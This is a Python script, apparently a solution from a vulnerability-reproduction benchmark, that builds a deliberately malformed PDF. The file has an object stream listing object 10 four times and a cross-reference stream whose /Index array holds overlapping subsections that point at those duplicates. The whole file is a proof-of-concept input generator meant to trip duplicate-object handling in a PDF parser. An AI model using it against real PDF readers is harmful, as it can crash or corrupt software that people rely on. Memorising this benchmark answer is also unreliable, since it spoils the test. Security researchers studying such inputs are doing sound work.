import os
from typing import Dict, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        def pdf_obj(num: int, body: bytes) -> bytes:
            return (f"{num} 0 obj\n".encode("ascii") + body + b"\nendobj\n")

        def pdf_stream_obj(num: int, dict_items: bytes, stream_data: bytes) -> bytes:
            # dict_items should be without enclosing << >>
            d = b"<< " + dict_items + b" >>"
            return (
                f"{num} 0 obj\n".encode("ascii")
                + d
                + b"\nstream\n"
                + stream_data
                + b"\nendstream\nendobj\n"
            )

        def build_objstm_with_duplicate_objnum(objstm_num: int, dup_objnum: int, n: int) -> Tuple[bytes, int]:
            # Create an object stream that claims to contain the same object number multiple times.
            # Each embedded object is a simple empty dictionary.
            embedded = [b"<<>>" for _ in range(n)]
            objdata = b" ".join(embedded)
            offsets = []
            pos = 0
            for i, tok in enumerate(embedded):
                offsets.append(pos)
                pos += len(tok)
                if i != len(embedded) - 1:
                    pos += 1  # space

            parts = []
            for off in offsets:
                parts.append(str(dup_objnum).encode("ascii"))
                parts.append(b" ")
                parts.append(str(off).encode("ascii"))
                parts.append(b" ")
            index_part = b"".join(parts)
            first = len(index_part)
            stream_data = index_part + objdata
            length = len(stream_data)

            dict_items = (
                b"/Type /ObjStm "
                + b"/N "
                + str(n).encode("ascii")
                + b" "
                + b"/First "
                + str(first).encode("ascii")
                + b" "
                + b"/Length "
                + str(length).encode("ascii")
            )
            return pdf_stream_obj(objstm_num, dict_items, stream_data), n

        header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

        # Use object number 10 as the duplicated compressed object
        dup_objnum = 10
        objstm_num = 5
        xref_num = 6

        # Make multiple duplicate xref entries for object 10, pointing to different indices
        n_dup_entries = 4  # object stream will contain 4 entries all claiming to be object 10
        objstm_bytes, n_in_objstm = build_objstm_with_duplicate_objnum(objstm_num, dup_objnum, n_dup_entries)

        obj1 = pdf_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        obj2 = pdf_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        obj3 = pdf_obj(
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources 10 0 R /Contents 4 0 R >>",
        )
        contents_data = b"q\nQ\n"
        obj4 = pdf_stream_obj(4, b"/Length 4", contents_data)
        obj5 = objstm_bytes

        # Assemble first, record offsets
        pieces: List[bytes] = [header]
        offsets: Dict[int, int] = {}

        def add(num: int, data: bytes) -> None:
            offsets[num] = sum(len(p) for p in pieces)
            pieces.append(data)

        add(1, obj1)
        add(2, obj2)
        add(3, obj3)
        add(4, obj4)
        add(objstm_num, obj5)

        # Offset for xref stream object
        off_xref = sum(len(p) for p in pieces)

        def pack_entry(t: int, f1: int, f2: int) -> bytes:
            return bytes([t]) + f1.to_bytes(4, "big", signed=False) + f2.to_bytes(2, "big", signed=False)

        # Build /Index with overlapping sections for object 10:
        # base section: [0 11] includes object 10 once, then extra sections [10 1] repeated for each additional duplicate
        # total entries = 11 + (n_dup_entries - 1)
        index_array = [0, 11] + [10, 1] * (n_dup_entries - 1)

        entries: List[bytes] = []
        # Base subsection 0..10
        for objnum in range(0, 11):
            if objnum == 0:
                entries.append(pack_entry(0, 0, 65535))
            elif objnum in offsets:
                entries.append(pack_entry(1, offsets[objnum], 0))
            elif objnum == xref_num:
                entries.append(pack_entry(1, off_xref, 0))
            elif objnum == dup_objnum:
                # First occurrence points to index 0
                entries.append(pack_entry(2, objstm_num, 0))
            else:
                entries.append(pack_entry(0, 0, 0))

        # Overlapping subsections for object 10: indices 1..n_dup_entries-1
        for idx in range(1, n_dup_entries):
            entries.append(pack_entry(2, objstm_num, idx))

        xref_stream = b"".join(entries)
        xref_length = len(xref_stream)

        xref_dict_items = (
            b"/Type /XRef "
            + b"/Size 11 "
            + b"/Root 1 0 R "
            + b"/W [1 4 2] "
            + b"/Index ["
            + b" ".join(str(x).encode("ascii") for x in index_array)
            + b"] "
            + b"/Length "
            + str(xref_length).encode("ascii")
        )

        xref_obj = (
            f"{xref_num} 0 obj\n".encode("ascii")
            + b"<< "
            + xref_dict_items
            + b" >>\nstream\n"
            + xref_stream
            + b"\nendstream\nendobj\n"
        )

        pieces.append(xref_obj)

        startxref = off_xref
        pieces.append(b"startxref\n" + str(startxref).encode("ascii") + b"\n%%EOF\n")

        return b"".join(pieces)